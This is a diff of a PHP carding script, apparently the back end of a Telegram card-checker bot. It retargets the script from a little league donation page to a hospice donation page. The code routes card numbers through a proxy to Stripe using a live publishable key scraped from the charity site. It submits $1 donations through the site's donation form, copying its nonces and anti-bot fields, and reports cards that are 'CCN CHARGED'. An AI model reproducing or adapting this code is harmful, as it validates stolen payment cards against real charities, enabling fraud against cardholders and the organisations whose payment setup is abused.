@@ -321,6 +321,7 @@ Req: <code>@$username</code>
 </b>");
 # -------------------- [1 REQ] -------------------#
 
+
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
@@ -348,9 +349,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=de793cd1-234c-489c-a225-13d4234ec9df3f0f8a&sid=09beb3bc-8af9-4aaa-8f48-62a631242cbc249647&pasted_fields=number&payment_user_agent=stripe.js%2F6b5c1f108a%3B+stripe-js-v3%2F6b5c1f108a%3B+card-element&referrer=https%3A%2F%2Fpalmshieldslittleleague.org&time_on_page=175057&key=pk_live_51OhhCZH5sfadB6Peun7wtHShTNQnMWcBFAKdFmZHvKrKSxEFxtmvbcoLX7fgrbmWie4lPKK2c7HUJs37RAHaMM5G00FVpWqg0t&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYg-hQXGh6IyeUWWF2H5snk4JwT4tktC_cJ5DE4yyJmmL1EPJx7q_h_O8PSKVNeWHwY7oFzwT8Mmn7UWWH_H70EyiAARtA6lmx6MO7n4VdxOQm2N42JuO17YMsl9jcRMZVO99Fv4CD5vzKzUHNkVSJVoQgFJPINbPkchGvhU3E1R3t_JGQtZiqhpMB9oiQAvbB1DD9DEDBx4ALsMlmQFZZ2WJMwZDeI-nG3h7iQ-5Pmw0s6xmww2j3ylGTM6GxdIOwz-3jxUXUJ7FqT2WFNiGtInBHmf11UsQ8lX-giOexG2hB4Z0NmwpKIslcm-ceIzKXX2bz_7jWtHbvWAo6XPvOpmjxG3LV62oKrw_453-Kncd4OUzKkIXD0JuI-wDCiGRxZ_4FGaRzPlIvxz-GVe1alrSq3KtFjU-gDt7gozBh9aoeWZYRD1I-NRFUyserJFOt7JPvdzCbFz1BCZALTUwfm-IYgrrDISE1msXu0YHXbUOEmssuxQfnKqEqY-r6Wq3X6rTtZomq2v-XvG8PFfJY0LEGoX75-5m6LIIF0932Nb6T6XAbV3ifWoS_yZVwXA2kU1lmSNHowiaGd0OKZEhmjZGl0lAGtNEessQmbaF6HDuD4Cuh7-UPLg2-5p3XEpogGjElmd9ormgtNLJoAqfz_i_AlarniTDQjd4xeBCSvQemNVDHCFZSuQN7zlTexIflMYkgxsg2vf2ibnm6okeL5bLb5FvgOtP1uviAG8TlaQyjjqVgl3u9Spp97OZyBgEggIyEP_T7CLefyZ-dW4eRVDwfVEUL4CbSB6UG4X21BqMflw715RUtET8pWqZ49sH5L8q4IMs7k1mXFRwQtyBpCvF0TFhGOa5Ca4GWuc0DJzQ6pjYvCK2ii1yaSWc-JHPf3fvPNs3h-8h701ood6ne-T1y_kPK9-ZPuRK2rfAwX-49Bp0RWE4T4XgBrUqIaIm8if0PB3OK_87Jr0ZLuvju-QwLrK6GnO1D_ErRY7i1_vGKTzWu3x4qybvvGMl-WBHziSgdZhV0mqft7hrWdZyhluNDeFExc8bDmCz-7pX56cRFyzZDTAZ7GHt-KQfGeVN6onjY8mJIW2PTugAPITFVb8kO2gjsPKERoMRHrdyt8hwA2Y_nMkJBlHe3btZjOXUMFwfDIo__VHM_7cD9F-1JB4fIakfJICUaD_5KvjIM5Lpa1JuAshElkDLKF33gzGQVc6ohVQO4DEk_Ngqr6abTTHuaP3sNhmHftZt3M9TwxhKSYWOqzRPvrt7v-yxuyLxsigzg1sIHshnoo0r-HHoxJW1sI6k3ik-dARiAGSf4rsgVmzqdgz-yPU-Ac0T7FO9oWobRbc1ByJlAUQRHV5-F6-CdayqyxzGXSiBfg6RHKtnWvG2cipGKmwaeUK-5YN7umAvFD0aZ64CUAayx524o9PFwchyny2t2uqSmQ7rxxSZ06tF21jCcgnWwT0ZQ3BOmcOSz8OEJXFq7GWxQ4UXAouMTroYyKODyLK6WKcKrKcG1P85uxE-F31gLNrm-u5FBfO-80HET6BbC9Rl9-7PmjnhmOJRmvkVyRPzxFykZW3Z-YBiM7qtep34KVQ48OuSqSSFVEhqpJqzHAhpZEBb2oWb1wDqEbuxON-fu2fgv3Jo2WTYMgh49cJUIsSmgXNe_CxRQgqNr4HJeUQHxPtgMgO-lPYvDsED_CawKHuYFMuELCwzpreb0SZQXC-PJtbtxVlPhZecEt5uh8Iu4GhZYqvXEdBS4iY8UHW4Z0rsC3_vT2wduA7Rh-7-8Gkg6eTZ1_aDPzdvnN3qGNcJylJb12IhzlzL1osdwx3wIBFIQ1yEECchIczVfB9ut2c01IooKMZRReYFMaXh8RwK8nWC1d2ZVS9daflEEhvV_6NxRta9eLhLHxQ3wYzyRpr386AzE1dG-Yre1xSQLFAzzrrrNUamEgL155kje2r_HRxyHXUjfjgw1PshwVMSxwC8_XcwFG9F6Y5gtu0n0CiLHr5OFwBVngHENhRKVNDrhrERufbeZo5Ujnmr80_eg3VjZWJmRt6P_a_9TLaeqXBGFbnuRxA39N6qMykkmrUjz3_gyfwxWjZXhwzmYCj2Coc2hhcmRfaWTOFZnkVKJrcqgzZTA1ZDA5NaJwZAA.QaC-j1Uu_w4i1sVo3rNNKOLmUHPMq30ukndRuTLoahs');
-
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=4bbd7843-3f30-472c-aa17-bea2923e58007c680c&sid=497c8554-6c45-4140-87ff-6590857b1cd03febcc&pasted_fields=number&payment_user_agent=stripe.js%2F42e38e0277%3B+stripe-js-v3%2F42e38e0277%3B+card-element&referrer=https%3A%2F%2Fhospicesenb.ca&time_on_page=104300&key=pk_live_51HSROsJidSrnbkCNweqOnOTO7wQwLWX6mRFNAP83H5YChtLFqLZTae4AhfoW7ATeXJ2x96XZQyaMetW9dPS1pEaR00ju9n1ZPO');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -359,7 +358,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://palmshieldslittleleague.org/wp-admin/admin-ajax.php?t=1711443689848');
+curl_setopt($ch, CURLOPT_URL, 'https://hospicesenb.ca/wp-admin/admin-ajax.php?t=1712216339006');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -370,23 +369,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1711443689848 h2',
-'Host: palmshieldslittleleague.org',
+'POST /wp-admin/admin-ajax.php?t=1712216339006 h2',
+'Host: hospicesenb.ca',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://palmshieldslittleleague.org',
+'origin: https://hospicesenb.ca',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://palmshieldslittleleague.org/donate/',
+'referer: https://hospicesenb.ca/donate/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D114%26_fluentform_4_fluentformnonce%3D1766f7947f%26_wp_http_referer%3D%252Fdonate%252F%26custom-payment-amount%3D1%26input_text%3DNY%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_method%3Dstripe%26__entry_intermediate_hash%3D54b05580aa4b46c167564915fbf2ed1d%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=4');
-
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=ak_hp_textarea%3D%26ak_js%3D1712216166069%26__fluent_form_embded_post_id%3D743%26_fluentform_3_fluentformnonce%3D3681263a9a%26_wp_http_referer%3D%252Fdonate%252F%26dropdown_8%3DOne%2520Time%26dropdown%3DIndividual%26dropdown_1%3DGeneral%26custom-payment-amount%3D1%26payment_method_3%3Dstripe%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26input_text_2%3D0817480671%26email%3Dgloosmoke%2540gmail.com%26address1%255Baddress_line_1%255D%3DStreet%252027%26address1%255Baddress_line_2%255D%3DNew%2520York%26address1%255Bcity%255D%3DNY%26address1%255Bzip%255D%3D10014%26address1%255Bcountry%255D%3DUS%26dropdown_4%3D%26description%3D%26dropdown_5%3D%26description_1%3D%26description_2%3D%26description_3%3D%26description_4%3D%26ak_bib%3D1712216175209%26ak_bfs%3D1712216247002%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B%26ak_bmcc%3D19%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D6%26ak_btmc%3D0%26ak_bsc%3D23%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B%26ak_bib%3D1712216175209%26ak_bfs%3D1712216271012%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B%26ak_bmcc%3D22%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D29%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__entry_intermediate_hash%3D907b45810dec7141db43ddd31dc98909%26ak_bib%3D1712216175209%26ak_bfs%3D1712216337482%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B8%252C65029%253B3%252C1429%253B%26ak_bmcc%3D24%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D32%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
 
 $result2 = curl_exec($ch);
 
@@ -408,7 +406,7 @@ if (
     strpos($result2, "Thank you for becoming a member") !== false ||
     strpos($result2, 'Membership confirmed.') !== false ||
     strpos($result2, 'Membership Confirmation') !== false ||
-    strpos($result2, 'Thank you for your message. We will get in touch with you shortly') !== false ||
+    strpos($result2, 'Thank you for your donation. We will get in touch with you shortly') !== false ||
     strpos($result2, 'incorrect_zip') !== false ||
     strpos($result2, 'Success ') !== false ||
     strpos($result2, '"type":"one-time"') !== false ||
@@ -419,7 +417,7 @@ $resp = "<b>[火]Stripe Charge 1$ 🌩
 ━━━━━━━━━━━━━
 •┌CC: <code>$lista</code>
 •├Status: CCN CHARGED 1$
-•└Response: <code>Thank you for your message.</code>
+•└Response: <code>Thank you for your donation.</code>
 
 •├Bank: <code>$bank</code>
 •├Brand: <code>$brand</code>
